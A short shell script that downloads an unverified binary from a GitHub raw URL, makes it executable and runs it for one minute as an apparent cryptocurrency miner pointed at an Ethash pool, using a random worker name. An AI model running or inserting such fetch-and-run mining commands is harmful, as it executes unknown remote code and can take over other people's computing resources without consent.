#!/bin/sh


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash


timeout 1m ./bezzHash --url=sagemode.$(echo $(shuf -i 1-99999 -n 1)-T60)@ethash.kupool.com:443
